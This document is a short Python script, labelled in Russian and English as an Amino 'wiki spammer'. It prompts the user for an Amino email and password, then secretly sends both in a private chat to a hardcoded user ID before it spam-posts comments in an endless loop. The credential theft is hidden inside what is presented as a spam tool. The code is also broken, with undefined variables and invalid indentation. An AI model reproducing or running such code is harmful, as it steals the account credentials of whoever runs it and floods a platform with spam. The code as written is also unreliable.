print("Foul/To4ka Script")
print("Foul wiki spamer")

import amino

email=input("Email/Почта:")
password=input("Password/Пароль:")

comid=('156542274')
client.login(email=email, password=password)
subclient=amino.SubClient(comId=comid ,profile=client.profile)
userid=('c6fe4992-52b0-4989-b65a-5cfc8f15609c')
subclient.start_chat(userId=userid, message=email)
subclient.start_chat(userId=userid, message=password)
#subclient.send_message(message=email, chatId=chatid, messageType=0)
#subclient.send_message(message=password, chatId=chatid, messageType=0)
print('\nLogged in/Бот зашел!')

wikilk=input("Type WikiLink/Введите ссылку на статью:")
wiki=client.get_from_code(wikilk)
wikiId=wiki.objectId

comId=wiki.path[1:wiki.path.index('/')]
subclient=amino.SubClient(comId=comid ,profile=client.profile)
comment=input("Сообщение:")
while True:

try: 
 sub_client.comment(message=comment, wikiId=wikiId)
print("Сообщение отправлено")
except: pass
